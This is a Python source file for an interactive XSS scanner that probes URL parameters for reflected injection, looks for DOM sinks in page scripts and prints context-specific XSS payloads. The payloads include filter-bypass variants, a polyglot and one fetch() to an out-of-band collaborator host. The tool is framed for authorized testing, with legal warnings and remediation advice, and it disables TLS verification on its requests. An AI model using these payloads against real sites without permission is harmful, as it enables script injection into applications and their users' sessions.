import requests
import re
import urllib.parse
import json
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
init(autoreset=True)

def analyze_source_context(html, test_marker):
    contexts = []
    script_pattern = r'<script[^>]*>.*?(%s).*?</script>' % re.escape(test_marker)
    if re.search(script_pattern, html, re.DOTALL | re.IGNORECASE):
        contexts.append({
            'type': 'SCRIPT_TAG',
            'risk': 'CRITICAL',
            'bypass': [
                "';alert(1);//",
                "';fetch('https://your-burp-collaborator.net');//"
            ],
            'explanation': 'Payload inside <script> tag - direct code execution context'
        })
    event_pattern = r'(on\w+\s*=\s*[\'"])[^\'"]*?(%s)' % re.escape(test_marker)
    if re.search(event_pattern, html, re.IGNORECASE):
        contexts.append({
            'type': 'EVENT_HANDLER',
            'risk': 'CRITICAL',
            'bypass': [
                '" onfocus=alert(1) autofocus="',
                '" onload=alert(1) '
            ],
            'explanation': 'Payload in event handler (onclick, onerror, etc.)'
        })
    attr_pattern = r'(\w+\s*=\s*[\'"])[^\'"]*?(%s)' % re.escape(test_marker)
    if re.search(attr_pattern, html, re.IGNORECASE):
        contexts.append({
            'type': 'HTML_ATTRIBUTE',
            'risk': 'HIGH',
            'bypass': [
                '" autofocus onfocus=alert(1) x="',
                '" onmouseover=alert(1) x="'
            ],
            'explanation': 'Payload inside HTML attribute value'
        })
    comment_pattern = r'<!--.*?(%s).*?-->' % re.escape(test_marker)
    if re.search(comment_pattern, html, re.DOTALL | re.IGNORECASE):
        contexts.append({
            'type': 'HTML_COMMENT',
            'risk': 'MEDIUM',
            'bypass': [
                '--><img src=x onerror=alert(1)>',
                '--><script>alert(1)</script>'
            ],
            'explanation': 'Payload inside HTML comment - may break out'
        })
    if test_marker in html and not re.search(r'<(script|style)', html, re.IGNORECASE):
        contexts.append({
            'type': 'HTML_TEXT',
            'risk': 'MEDIUM',
            'bypass': [
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>'
            ],
            'explanation': 'Payload in HTML text context - tag injection possible'
        })
    return contexts

def detect_dom_sinks(html, target):
    sinks = []
    soup = BeautifulSoup(html, 'html.parser')
    scripts = []
    for script in soup.find_all('script'):
        if script.string:
            scripts.append(script.string)
        elif script.get('src'):
            try:
                js_url = urllib.parse.urljoin(target, script['src'])
                js_resp = requests.get(js_url, timeout=5, verify=False)
                if js_resp.status_code == 200:
                    scripts.append(js_resp.text)
            except:
                pass
    dangerous_sinks = [
        ('.innerHTML', 'innerHTML assignment'),
        ('.outerHTML', 'outerHTML assignment'),
        ('document.write', 'document.write'),
        ('document.writeln', 'document.writeln'),
        ('eval(', 'eval()'),
        ('setTimeout(', 'setTimeout with string'),
        ('setInterval(', 'setInterval with string'),
        ('location.href', 'location assignment'),
        ('location.search', 'location.search usage'),
        ('location.hash', 'location.hash usage'),
        ('document.URL', 'document.URL usage'),
        ('document.documentURI', 'document.documentURI usage')
    ]
    sources = [
        'location.search',
        'location.hash',
        'location.href',
        'document.URL',
        'document.documentURI',
        'document.referrer',
        'window.name',
        'history.pushState',
        'history.replaceState'
    ]
    for script_content in scripts:
        for sink_pattern, sink_desc in dangerous_sinks:
            if sink_pattern in script_content:
                vulnerable_sources = [src for src in sources if src in script_content]
                if vulnerable_sources:
                    sinks.append({
                        'sink': sink_desc,
                        'sources': vulnerable_sources,
                        'risk': 'CRITICAL',
                        'payloads': [
                            f'#<img src=x onerror=alert(document.domain)>',
                            f'?q=<svg onload=alert(1)>'
                        ],
                        'explanation': f'DOM sink "{sink_desc}" uses user-controlled source: {", ".join(vulnerable_sources)}'
                    })
    return sinks

def generate_bypass_payloads(context_type):
    base_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script>alert`1`</script>",
        "<img src=x onerror=alert(String.fromCharCode(49))>",
        "<body onload=alert(1)>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/alert(1)//'>",
        '" onfocus=alert(1) autofocus="',
        "' onfocus=alert(1) autofocus='",
        "x\" onfocus=alert(1) autofocus=\"",
        "--><script>alert(1)</script>",
        "--><img src=x onerror=alert(1)>"
    ]
    if context_type == 'SCRIPT_TAG':
        base_payloads.extend([
            "';alert(1);//",
            "';alert(1)/*",
            "+alert(1)//",
            "alert(1)//"
        ])
    elif context_type == 'EVENT_HANDLER':
        base_payloads.extend([
            "';alert(1);//",
            '" onfocus=alert(1) autofocus="',
            "x' onfocus=alert(1) autofocus='x"
        ])
    elif context_type == 'HTML_ATTRIBUTE':
        base_payloads.extend([
            '" autofocus onfocus=alert(1) x="',
            "' autofocus onfocus=alert(1) x='",
            "x\" onfocus=alert(1) x=\""
        ])
    return base_payloads

def test_parameter(target, param, value_template):
    test_marker = "XSS_TEST_1337_" + param
    test_value = value_template.replace("{PAYLOAD}", test_marker)
    parsed = urllib.parse.urlparse(target)
    query_params = urllib.parse.parse_qs(parsed.query)
    query_params[param] = [test_value]
    new_query = urllib.parse.urlencode(query_params, doseq=True)
    test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
    try:
        resp = requests.get(test_url, timeout=10, verify=False)
        if test_marker in resp.text:
            contexts = analyze_source_context(resp.text, test_marker)
            return {
                'param': param,
                'url': test_url,
                'reflected': True,
                'contexts': contexts,
                'response_length': len(resp.text)
            }
    except:
        pass
    return None

def run():
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"{Fore.CYAN}║{Fore.GREEN}          ADVANCED XSS SCANNER                                     {Fore.CYAN}║")
    print(f"{Fore.CYAN}║{Fore.GREEN}  Source Code Analysis • Filter Bypass • DOM Sink Detection       {Fore.CYAN}║")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    target = input(f"\n{Fore.YELLOW}Enter target URL with parameters (e.g., http://site.com/search?q=test): {Style.RESET_ALL}").strip()
    if not target:
        print(f"\n{Fore.RED}[!] Empty input. Aborting.{Style.RESET_ALL}")
        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
        return
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    print(f"\n{Fore.CYAN}[+] Starting advanced XSS analysis for: {target}{Style.RESET_ALL}")
    try:
        resp = requests.get(target, timeout=10, verify=False)
        soup = BeautifulSoup(resp.text, 'html.parser')
        print(f"\n{Fore.GREEN}[✓] Page loaded successfully (Status: {resp.status_code}){Style.RESET_ALL}")
        parsed = urllib.parse.urlparse(target)
        query_params = urllib.parse.parse_qs(parsed.query)
        if not query_params:
            print(f"\n{Fore.YELLOW}[!] No URL parameters found. Analyzing forms...{Style.RESET_ALL}")
            forms = soup.find_all('form')
            if forms:
                print(f"{Fore.GREEN}[✓] Found {len(forms)} form(s) on page{Style.RESET_ALL}")
                for i, form in enumerate(forms, 1):
                    action = form.get('action', target)
                    method = form.get('method', 'get').upper()
                    inputs = form.find_all('input')
                    print(f"\n{Fore.CYAN}Form #{i}:{Style.RESET_ALL}")
                    print(f"   Action: {action}")
                    print(f"   Method: {method}")
                    for inp in inputs:
                        name = inp.get('name', 'unknown')
                        itype = inp.get('type', 'text')
                        print(f"   • Input: {name} (type={itype})")
                print(f"\n{Fore.YELLOW}[i] Manual testing recommended for form inputs{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] No parameters or forms found. XSS testing requires injection points.{Style.RESET_ALL}")
                input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
                return
        else:
            print(f"\n{Fore.GREEN}[✓] Found {len(query_params)} URL parameter(s): {', '.join(query_params.keys())}{Style.RESET_ALL}")
        results = []
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.CYAN}XSS VULNERABILITY ANALYSIS")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        for param in query_params.keys():
            print(f"\n{Fore.CYAN}[→] Testing parameter: {param}{Style.RESET_ALL}")
            test_templates = [
                "{PAYLOAD}",
                "test {PAYLOAD}",
                "<tag>{PAYLOAD}</tag>",
                '"{PAYLOAD}"',
                "'{PAYLOAD}'",
            ]
            for template in test_templates:
                result = test_parameter(target, param, template)
                if result and result['contexts']:
                    results.append(result)
                    print(f"{Fore.GREEN}[✓] REFLECTED in parameter '{param}' with template '{template}'{Style.RESET_ALL}")
                    for ctx in result['contexts']:
                        risk_color = Fore.MAGENTA if ctx['risk'] == 'CRITICAL' else (Fore.RED if ctx['risk'] == 'HIGH' else Fore.YELLOW)
                        print(f"\n{risk_color}  • Context: {ctx['type']} ({ctx['risk']}){Style.RESET_ALL}")
                        print(f"    Explanation: {ctx['explanation']}")
                        print(f"    {Fore.CYAN}    Recommended payloads:{Style.RESET_ALL}")
                        for payload in ctx['bypass'][:3]:
                            print(f"      {Fore.GREEN}→ {payload}{Style.RESET_ALL}")
                    break
        print(f"\n{Fore.CYAN}[→] Analyzing DOM sinks in JavaScript...{Style.RESET_ALL}")
        dom_sinks = detect_dom_sinks(resp.text, target)
        if dom_sinks:
            print(f"{Fore.MAGENTA}[!] DOM XSS SINKS DETECTED{Style.RESET_ALL}")
            for sink in dom_sinks:
                risk_color = Fore.MAGENTA if sink['risk'] == 'CRITICAL' else Fore.RED
                print(f"\n{risk_color}• Sink: {sink['sink']} ({sink['risk']}){Style.RESET_ALL}")
                print(f"  Sources: {', '.join(sink['sources'])}")
                print(f"  Explanation: {sink['explanation']}")
                print(f"  {Fore.CYAN}  Test payloads:{Style.RESET_ALL}")
                for payload in sink['payloads']:
                    print(f"    {Fore.GREEN}→ {payload}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[✓] No obvious DOM sinks detected{Style.RESET_ALL}")
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.CYAN}SCAN RESULTS SUMMARY")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        if results or dom_sinks:
            print(f"\n{Fore.RED}[!] XSS VULNERABILITIES DETECTED{Style.RESET_ALL}")
            if results:
                print(f"\n{Fore.MAGENTA}🔍 Reflected XSS Findings:{Style.RESET_ALL}")
                for res in results:
                    print(f"\n{Fore.CYAN}Parameter: {res['param']}{Style.RESET_ALL}")
                    print(f"URL: {res['url'][:80]}...")
                    for ctx in res['contexts']:
                        risk_color = Fore.MAGENTA if ctx['risk'] == 'CRITICAL' else (Fore.RED if ctx['risk'] == 'HIGH' else Fore.YELLOW)
                        print(f"\n{risk_color}Context: {ctx['type']} ({ctx['risk']}){Style.RESET_ALL}")
                        print(f"Explanation: {ctx['explanation']}")
                        print(f"\n{Fore.GREEN}✅ SAFE VERIFICATION PAYLOADS (MANUAL TESTING):{Style.RESET_ALL}")
                        print(f"   Copy ONE payload below and test manually in browser:")
                        for i, payload in enumerate(ctx['bypass'][:5], 1):
                            print(f"   {i}. {payload}")
                        print(f"\n{Fore.YELLOW}⚠️  SAFETY INSTRUCTIONS:{Style.RESET_ALL}")
                        print(f"   • Test ONLY on authorized systems")
                        print(f"   • Use incognito window to avoid cookie theft")
                        print(f"   • Replace 'alert(1)' with 'alert(document.domain)' for safer testing")
                        print(f"   • NEVER test with real user sessions")
            if dom_sinks:
                print(f"\n{Fore.MAGENTA}⚛️  DOM XSS Findings:{Style.RESET_ALL}")
                for sink in dom_sinks:
                    print(f"\n{Fore.CYAN}Sink: {sink['sink']}{Style.RESET_ALL}")
                    print(f"Sources: {', '.join(sink['sources'])}")
                    print(f"\n{Fore.GREEN}✅ SAFE VERIFICATION PAYLOADS:{Style.RESET_ALL}")
                    for payload in sink['payloads']:
                        print(f"   {payload}")
            print(f"\n{Fore.CYAN}{'='*70}")
            print(f"{Fore.CYAN}RECOMMENDATIONS")
            print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
            print(f"\n{Fore.YELLOW}For Developers:{Style.RESET_ALL}")
            print(f"   • Implement Context-Aware Output Encoding (OWASP Encoder)")
            print(f"   • Use Content Security Policy (CSP) headers")
            print(f"   • Sanitize inputs with DOMPurify (for client-side)")
            print(f"   • Avoid dangerous sinks (innerHTML, eval, etc.)")
            print(f"   • Use safe alternatives (textContent, createElement)")
            print(f"\n{Fore.YELLOW}For Pentesters:{Style.RESET_ALL}")
            print(f"   • Manually verify ALL findings before reporting")
            print(f"   • Test with multiple browsers (Chrome, Firefox, Safari)")
            print(f"   • Check for WAF bypass techniques:")
            print(f"        - Double encoding")
            print(f"        - Invalid UTF-8 sequences")
            print(f"        - Alternative vectors (SVG, MathML)")
            print(f"   • Document exact steps to reproduce")
            print(f"   • NEVER exploit beyond proof-of-concept (alert)")
        else:
            print(f"\n{Fore.GREEN}[✓] No XSS vulnerabilities detected in automated scan{Style.RESET_ALL}")
            print(f"\n{Fore.YELLOW}[i] Important notes:{Style.RESET_ALL}")
            print(f"   • False negatives common (WAFs, complex JS)")
            print(f"   • Manual testing REQUIRED for critical applications")
            print(f"   • Test these areas manually:")
            print(f"        - File upload fields (SVG files)")
            print(f"        - HTTP headers (User-Agent, Referer)")
            print(f"        - JSON responses consumed by JS")
            print(f"        - WebSocket messages")
            print(f"        - PostMessage handlers")
        save = input(f"\n{Fore.YELLOW}Save detailed report to reports/xss_scan_*.txt? (yes/no): {Style.RESET_ALL}").strip().lower()
        if save == "yes":
            import datetime
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            hostname = urllib.parse.urlparse(target).hostname or target.replace(':', '_').replace('/', '_')
            filename = f"reports/xss_scan_{hostname}_{timestamp}.txt"
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write("="*70 + "\n")
                    f.write("ADVANCED XSS SCANNER — DETAILED REPORT\n")
                    f.write("="*70 + "\n")
                    f.write(f"Target: {target}\n")
                    f.write(f"Scan Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Scanner: VulEye Advanced XSS Scanner\n")
                    f.write("="*70 + "\n\n")
                    if results:
                        f.write("REFLECTED XSS FINDINGS\n")
                        f.write("-"*70 + "\n")
                        for res in results:
                            f.write(f"\nParameter: {res['param']}\n")
                            f.write(f"Test URL: {res['url']}\n")
                            for ctx in res['contexts']:
                                f.write(f"\nContext: {ctx['type']} ({ctx['risk']})\n")
                                f.write(f"Explanation: {ctx['explanation']}\n")
                                f.write("Recommended Payloads:\n")
                                for payload in ctx['bypass'][:5]:
                                    f.write(f"  → {payload}\n")
                    if dom_sinks:
                        f.write("\n\nDOM XSS FINDINGS\n")
                        f.write("-"*70 + "\n")
                        for sink in dom_sinks:
                            f.write(f"\nSink: {sink['sink']}\n")
                            f.write(f"Sources: {', '.join(sink['sources'])}\n")
                            f.write(f"Explanation: {sink['explanation']}\n")
                            f.write("Test Payloads:\n")
                            for payload in sink['payloads']:
                                f.write(f"  → {payload}\n")
                    f.write("\n" + "="*70 + "\n")
                    f.write("SAFETY & ETHICAL NOTES\n")
                    f.write("="*70 + "\n")
                    f.write("• This report is for AUTHORIZED TESTING ONLY\n")
                    f.write("• Manual verification required before reporting\n")
                    f.write("• NEVER exploit beyond proof-of-concept (alert)\n")
                    f.write("• Maintain written authorization documentation\n")
                print(f"\n{Fore.GREEN}[✓] Report saved: {filename}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[i] Contains SAFE verification payloads only{Style.RESET_ALL}")
            except Exception as e:
                print(f"\n{Fore.RED}[!] Error saving report: {e}{Style.RESET_ALL}")
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.GREEN}[✓] XSS analysis completed{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}⚠️  FINAL LEGAL REMINDER:{Style.RESET_ALL}")
        print(f"   • XSS exploitation without authorization = criminal offense")
        print(f"   • Even 'harmless' alert() may violate computer fraud laws")
        print(f"   • Always obtain WRITTEN permission before ANY testing")
        print(f"   • Document all testing activities for legal protection")
    except requests.exceptions.Timeout:
        print(f"\n{Fore.RED}[!] Request timeout. Target may be unreachable.{Style.RESET_ALL}")
    except requests.exceptions.ConnectionError:
        print(f"\n{Fore.RED}[!] Connection error. Check if target is accessible.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
    input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        requests.packages.urllib3.disable_warnings()
        run()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Scan interrupted by user.{Style.RESET_ALL}")
        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")